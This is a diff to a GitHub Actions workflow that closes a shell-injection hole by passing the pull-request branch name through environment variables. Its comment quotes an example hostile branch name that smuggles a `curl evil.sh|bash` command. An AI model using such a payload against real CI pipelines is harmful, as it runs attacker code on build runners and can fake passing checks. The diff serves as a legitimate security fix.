@@ -631,9 +631,28 @@ jobs:
       # .githooks/commit-msg from the same stamp the hook reads. `branch_also_allows` in
       # ownership.yaml bounds which lanes a prefix may stamp.
       - name: Ownership check
+        # THE BRANCH NAME IS ATTACKER CONTROLLED AND IT USED TO BE PASTED INTO THIS SHELL.
+        #
+        # `github.head_ref` is the SOURCE BRANCH of a pull request, which on a fork PR is
+        # whatever a stranger typed. `${{ }}` is expanded by the runner into the script text
+        # BEFORE bash parses it, so a branch named `x";curl evil.sh|bash;"` used to become a
+        # command rather than a string. This repo is public, so anybody could open that PR.
+        #
+        # The blast radius was bounded and it was never nothing. A `pull_request` run on a fork
+        # gets a read-only token and no secrets, and this repo keeps no secrets in workflows at
+        # all, so there was nothing to steal. What was reachable is arbitrary code on a runner
+        # billed to this account, and a guards check that reports whatever the attacker wants,
+        # which is how a hostile pull request gets a green tick.
+        #
+        # Passing through `env:` is the fix. The value reaches bash as a variable rather than as
+        # script text, so a branch full of quotes and semicolons is a weird string and nothing
+        # more. Never interpolate `${{ }}` straight into a `run:` block.
+        env:
+          BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
         run: |
-          BRANCH="${{ github.head_ref || github.ref_name }}"
-          BASE="${{ github.event.pull_request.base.sha }}"
+          BRANCH="$BRANCH_NAME"
+          BASE="$BASE_SHA"
           if [ -n "$BASE" ]; then
             RANGE="$BASE...HEAD"
           else
